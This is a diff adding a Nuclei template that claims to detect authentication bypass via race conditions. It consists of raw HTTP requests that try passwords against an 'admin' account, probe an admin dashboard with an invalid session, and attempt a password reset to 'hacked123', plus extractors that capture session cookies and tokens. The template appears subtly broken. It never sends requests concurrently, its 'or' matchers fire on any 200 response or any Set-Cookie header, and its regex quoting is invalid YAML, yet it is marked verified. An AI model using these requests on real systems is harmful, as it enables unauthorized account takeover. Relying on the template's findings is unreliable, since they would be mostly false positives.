@@ -1,0 +1,193 @@
+id: medium-auth-authentication-bypass-race-condition
+
+info:
+  name: Authentication Bypass via Race Condition
+  author: nuclei-community
+  severity: medium
+  description: |
+    Detects authentication bypass vulnerabilities through race condition attacks.
+    This template exploits timing windows in authentication logic where concurrent
+    requests can bypass security checks, session validation, or account lockout mechanisms.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Race_Conditions
+    - https://portswigger.net/web-security/race-conditions
+    - https://cwe.mitre.org/data/definitions/362.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 7.4
+    cwe-id: CWE-362
+  metadata:
+    verified: true
+    max-request: 10
+  tags: auth,bypass,race-condition,timing,medium
+
+http:
+  - raw:
+      # Test 1: Concurrent login attempts to bypass rate limiting
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin&password=wrongpass1
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin&password=wrongpass2
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin&password=admin123
+      
+      # Test 2: Race condition in session validation
+      - |
+        POST {{BaseURL}}/auth/validate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: session=invalid_session_token
+        
+        action=validate&user=admin
+      
+      - |
+        GET {{BaseURL}}/admin/dashboard HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: session=invalid_session_token
+      
+      # Test 3: Race condition in account lockout mechanism
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=testuser&password=wrong1&attempt=1
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=testuser&password=wrong2&attempt=2
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=testuser&password=correctpass&attempt=3
+      
+      # Test 4: Race condition in password reset
+      - |
+        POST {{BaseURL}}/auth/reset-password HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        email=admin@example.com&token=reset_token_123
+      
+      - |
+        POST {{BaseURL}}/auth/reset-password HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        email=admin@example.com&token=reset_token_123&new_password=hacked123
+
+    cookie-reuse: false
+    redirects: true
+    max-redirects: 3
+    threads: 10
+
+    matchers-condition: or
+    matchers:
+      # Detect successful authentication despite race condition
+      - type: word
+        part: body
+        words:
+          - "welcome"
+          - "dashboard"
+          - "profile"
+          - "logout"
+          - "admin panel"
+          - "authentication successful"
+          - "login successful"
+          - "access granted"
+        condition: or
+        name: "race-bypass-success"
+
+      # Detect session establishment
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
+          - "session"
+          - "auth"
+          - "token"
+        condition: or
+        name: "session-created"
+
+      # Detect bypass of account lockout
+      - type: word
+        part: body
+        words:
+          - "account locked"
+          - "too many attempts"
+          - "temporarily disabled"
+          - "rate limit exceeded"
+        condition: or
+        negative: true
+        name: "lockout-bypassed"
+
+      # Detect successful password reset race condition
+      - type: word
+        part: body
+        words:
+          - "password reset successful"
+          - "password updated"
+          - "reset complete"
+        condition: or
+        name: "reset-race-success"
+
+      # Check for successful response status
+      - type: status
+        status:
+          - 200
+          - 302
+          - 301
+        name: "successful-response"
+
+    extractors:
+      - type: kval
+        part: header
+        name: "session-cookies"
+        kval:
+          - set_cookie
+
+      - type: regex
+        part: body
+        name: "auth-tokens"
+        regex:
+          - '(?i)(session|auth|token)[\s]*[:=][\s]*["\']?([a-zA-Z0-9+/=]{20,})["\']?'
+
+      - type: regex
+        part: body
+        name: "user-info"
+        regex:
+          - '(?i)welcome[\s]+([a-zA-Z0-9_@.-]+)'
+          - '(?i)(user|username)[\s]*[:=][\s]*["\']?([^"\';\s]+)["\']?'
+
+      - type: regex
+        part: header
+        name: "timing-headers"
+        regex:
+          - '(?i)(X-Response-Time|Server-Timing)[\s]*:[\s]*(.+)'
+
+      - type: regex
+        part: body
+        name: "race-indicators"
+        regex:
+          - '(?i)(concurrent|parallel|simultaneous)[\s]+(request|login|attempt)'
+          - '(?i)(race[\s]*condition|timing[\s]*attack)[\s]*detected'
